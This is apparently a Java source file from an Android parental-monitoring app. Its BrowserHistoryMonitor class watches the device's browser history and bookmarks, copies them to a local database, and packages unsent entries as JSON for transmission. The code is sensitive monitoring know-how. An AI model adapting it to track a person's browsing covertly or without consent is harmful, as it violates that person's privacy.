 package com.parent.management.monitor;
 
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
 import android.content.ContentValues;
 import android.content.Context;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
 import android.provider.Browser;
 import android.util.Log;
 
 import com.parent.management.ManagementApplication;
 import com.parent.management.db.ManagementProvider;
 import com.parent.management.db.ManagementProvider.BrowserBookmark;
 import com.parent.management.db.ManagementProvider.BrowserHistory;
 
 public class BrowserHistoryMonitor extends Monitor {
     private static final String TAG = ManagementApplication.getApplicationTag() + "." +
             BrowserHistoryMonitor.class.getSimpleName();
 
 	private BrowserDBObserver contentObserver = null;
 	private final int BROWSER_COLUMNS_BOOKMARK = 1;
     private final int BROWSER_COLUMNS_HISTORY = 0;
 
 	public BrowserHistoryMonitor(Context context) {
 		super(context);
 	    this.contentUri = Browser.BOOKMARKS_URI;
 	    this.contentObserver = new BrowserDBObserver(new Handler());
 	}
 
 	@Override
 	public void startMonitoring() {
 		this.contentResolver.registerContentObserver(this.contentUri, true, this.contentObserver);
 	    this.monitorStatus = true;
         checkForChange();
         Log.v(TAG, "---->started");
 	}
 
 	@Override
 	public void stopMonitoring() {
         this.contentResolver.unregisterContentObserver(this.contentObserver);
         this.monitorStatus = false;
         Log.d(TAG, "----> stopMonitoring");
 	}
 	
 	private class BrowserInfo {
 	    long id;
 	    String title;
 	    String url;
 	    int visitCount;
	    long lastVisit;
 	    int type;
 	    private void prettyPrint() {
             Log.v(TAG, "id=" + id + ";title=" + title + ";url=" + url + ";count=" + visitCount + ";last=" + lastVisit + ";type=" + type);
 	    }
 	}
 	
 	private class BrowserDBObserver extends ContentObserver {
 
 		public BrowserDBObserver(Handler handler) {
 			super(handler);
 		}
 		
 		@Override
         public void onChange(boolean selfChange) {
 		    checkForChange();
 		}
 		
 	}
 
     private void checkForChange() {
         String[] browserProj = new String[] {
                 Browser.BookmarkColumns._ID,
                 Browser.BookmarkColumns.TITLE,
                 Browser.BookmarkColumns.URL,
                 Browser.BookmarkColumns.VISITS,
                 Browser.BookmarkColumns.DATE,
                 Browser.BookmarkColumns.BOOKMARK };
         Cursor browserCur = ManagementApplication.getContext().getContentResolver().query(
                 Browser.BOOKMARKS_URI, browserProj, null, null, null);
         
         if (browserCur == null) {
             Log.v(TAG, "open browser db failed");
             return;
         }
         if (browserCur.moveToFirst() && browserCur.getCount() > 0) {
             while (browserCur.isAfterLast() == false) {
                 BrowserInfo browserInfo = new BrowserInfo();
                 browserInfo.id = browserCur.getLong(browserCur.getColumnIndex(Browser.BookmarkColumns._ID));
                 browserInfo.title = browserCur.getString(browserCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
                 browserInfo.url = browserCur.getString(browserCur.getColumnIndex(Browser.BookmarkColumns.URL));
                 browserInfo.visitCount = browserCur.getInt(browserCur.getColumnIndex(Browser.BookmarkColumns.VISITS));
                browserInfo.lastVisit = browserCur.getLong(browserCur.getColumnIndex(Browser.BookmarkColumns.DATE));
                 browserInfo.type = browserCur.getInt(browserCur.getColumnIndex(Browser.BookmarkColumns.BOOKMARK));
 
                 if (BROWSER_COLUMNS_BOOKMARK == browserInfo.type) {
                     if (!updateBrowserBookmarkDB(browserInfo)) {
                         break;
                     }
                 } 
                 else if (BROWSER_COLUMNS_HISTORY == browserInfo.type) {
                     if (!updateBrowserHistoryDB(browserInfo)) {
                         break;
                     }
                 }
                 else {
                     Log.v(TAG, "unknown browser db type:" + browserInfo.type);
                 }
                 browserCur.moveToNext();
             }
         }
         if (null != browserCur) {
             browserCur.close();
         }
     }
 
     private boolean updateBrowserHistoryDB(BrowserInfo browserInfo) {
         return updateLocalBrowserDB(browserInfo, BrowserHistory.TABLE_NAME, BrowserHistory.CONTENT_URI);
     }
 
     private boolean updateBrowserBookmarkDB(BrowserInfo browserInfo) {
         return updateLocalBrowserDB(browserInfo, BrowserBookmark.TABLE_NAME, BrowserBookmark.CONTENT_URI);
     }
     
     private boolean updateLocalBrowserDB(final BrowserInfo browserInfo, final String table, final Uri uri) {
         String[] browserLocalDBProj = new String[] { ManagementProvider.BrowserDB.ID,
                 ManagementProvider.BrowserDB.VISIT_COUNT};
         String browserLocalDBSel = ManagementProvider.BrowserDB.ID + " = \"" + browserInfo.id + "\"";
         Cursor browserLocalDBCur = ManagementApplication.getContext().getContentResolver().query(
                 uri, browserLocalDBProj, browserLocalDBSel, null, null);
         
         if (browserLocalDBCur == null) {
             Log.v(TAG, "open browser " + table + " failed");
             return false;
         }
         if (browserLocalDBCur.moveToFirst() && browserLocalDBCur.getCount() > 0) {
             int logged_visit_count = browserLocalDBCur.getInt(
                     browserLocalDBCur.getColumnIndex(ManagementProvider.BrowserDB.VISIT_COUNT));
             if (logged_visit_count != browserInfo.visitCount) {
                 final ContentValues values = new ContentValues();
                 values.put(ManagementProvider.BrowserDB.VISIT_COUNT, browserInfo.visitCount);
                 values.put(ManagementProvider.BrowserDB.LAST_VISIT, browserInfo.lastVisit);
                 values.put(ManagementProvider.BrowserDB.IS_SENT, ManagementProvider.IS_SENT_NO);
 
                 ManagementApplication.getContext().getContentResolver().update(
                         uri,
                         values,
                         ManagementProvider.BrowserDB.ID + "=\"" + browserInfo.id +"\"",
                         null);
                 browserInfo.prettyPrint();
                 Log.v(TAG, "update one");
             }
         } else {
             final ContentValues values = new ContentValues();
             values.put(ManagementProvider.BrowserDB.ID, browserInfo.id);
             values.put(ManagementProvider.BrowserDB.URL, browserInfo.url);
             values.put(ManagementProvider.BrowserDB.TITLE, browserInfo.title);
             values.put(ManagementProvider.BrowserDB.VISIT_COUNT, browserInfo.visitCount);
             values.put(ManagementProvider.BrowserDB.LAST_VISIT, browserInfo.lastVisit);
             
             ManagementApplication.getContext().getContentResolver().insert(
                     uri, values);
             browserInfo.prettyPrint();
             Log.v(TAG, "insert one");
         }
 
         if (null != browserLocalDBCur) {
             browserLocalDBCur.close();
         }
         return true;
     }
 
 
     @Override
     public JSONArray extractDataForSend() {
         try {
             JSONArray data = new JSONArray();
 
             String[] browserHistoryProj = new String[] {
                     ManagementProvider.BrowserHistory.URL,
                     ManagementProvider.BrowserHistory.TITLE,
                     ManagementProvider.BrowserHistory.VISIT_COUNT,
                     ManagementProvider.BrowserHistory.LAST_VISIT};
             String browserHistorySel = ManagementProvider.BrowserHistory.IS_SENT
                     + " = \"" + ManagementProvider.IS_SENT_NO + "\"";
             Cursor browserHistoryCur = ManagementApplication.getContext().getContentResolver().query(
                     ManagementProvider.BrowserHistory.CONTENT_URI,
                     browserHistoryProj, browserHistorySel, null, null);
 
             if (browserHistoryCur == null) {
                 Log.v(TAG, "open browserHistory native failed");
                 return null;
             }
             if (browserHistoryCur.moveToFirst() && browserHistoryCur.getCount() > 0) {
                 while (browserHistoryCur.isAfterLast() == false) {
                     String url = browserHistoryCur.getString(
                             browserHistoryCur.getColumnIndex(ManagementProvider.BrowserHistory.URL));
                     String title = browserHistoryCur.getString(
                             browserHistoryCur.getColumnIndex(ManagementProvider.BrowserHistory.TITLE));
                     int visit_count = browserHistoryCur.getInt(
                             browserHistoryCur.getColumnIndex(ManagementProvider.BrowserHistory.VISIT_COUNT));
                    long last_visit = browserHistoryCur.getLong(
                             browserHistoryCur.getColumnIndex(ManagementProvider.BrowserHistory.LAST_VISIT));

                     JSONObject raw = new JSONObject();
                     raw.put(ManagementProvider.BrowserHistory.URL, url);
                     raw.put(ManagementProvider.BrowserHistory.TITLE, title);
                     raw.put(ManagementProvider.BrowserHistory.VISIT_COUNT, visit_count);
                     raw.put(ManagementProvider.BrowserHistory.LAST_VISIT, last_visit);
 
                     data.put(raw);
                     browserHistoryCur.moveToNext();
                 }
             }
             if (null != browserHistoryCur) {
                 browserHistoryCur.close();
             }
             
             final ContentValues values = new ContentValues();
             values.put(ManagementProvider.BrowserHistory.IS_SENT, ManagementProvider.IS_SENT_YES);
             ManagementApplication.getContext().getContentResolver().update(
                     ManagementProvider.BrowserHistory.CONTENT_URI,
                     values,
                     ManagementProvider.BrowserHistory.IS_SENT + "=\"" + ManagementProvider.IS_SENT_NO +"\"",
                     null);
             
             return data;
         } catch (JSONException e) {
             // TODO Auto-generated catch block
             e.printStackTrace();
         }
 
         return null;
     }
 
     @Override
     public void updateStatusAfterSend(JSONArray failedList) {
     	if (null != failedList && failedList.length() != 0) {
     		for (int i = 0; i < failedList.length(); ++i) {
     			JSONObject obj = failedList.optJSONObject(i);
     			if (null != obj) {
     				long id = obj.optLong(ManagementProvider.BrowserHistory.ID);
     		        final ContentValues values = new ContentValues();
     		        values.put(ManagementProvider.BrowserHistory.IS_SENT, ManagementProvider.IS_SENT_NO);
     		        ManagementApplication.getContext().getContentResolver().update(
     		        		ManagementProvider.BrowserHistory.CONTENT_URI,
     		                values,
     		                ManagementProvider.BrowserHistory.ID + "=\"" + id +"\"",
     		                null);
     			}
     		}
     	}
     }
 
 }
